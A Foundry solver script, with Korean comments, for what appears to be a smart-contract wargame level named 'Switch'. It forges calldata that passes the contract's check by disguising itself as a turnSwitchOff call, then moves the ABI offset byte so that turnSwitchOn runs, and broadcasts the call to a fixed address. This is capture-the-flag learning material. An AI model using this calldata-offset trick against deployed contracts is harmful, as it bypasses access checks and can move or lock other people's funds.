// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
    
    function switchOn() external view returns (bool);
}
contract SolverScript is Script {

    ISwitch target;

    function setUp() public {
        target = ISwitch(0xa31C4Bdf7679d6BeE300F0dc0Ab0b0861E894991);
    }

    function run() public {
        vm.startBroadcast();

        // turnSwitchOff로 위장
        bytes memory data = abi.encodeWithSelector(
            ISwitch.flipSwitch.selector, 
            abi.encodeWithSelector(ISwitch.turnSwitchOff.selector)
        );

        // 끄트머리에 turnSwitchOn calldata 구성
        data = abi.encodePacked(
            data,
            bytes32(uint256(4)),
            abi.encodeWithSelector(ISwitch.turnSwitchOn.selector)
        );

        // bytes배열 시작점 변경
        data[4 + 32 - 1] = 0x60;
        
        console.logBytes(data);
        
        (bool success, ) = address(target).call(data);
        success;

        console.logBool(target.switchOn());

        vm.stopBroadcast();
    }
}
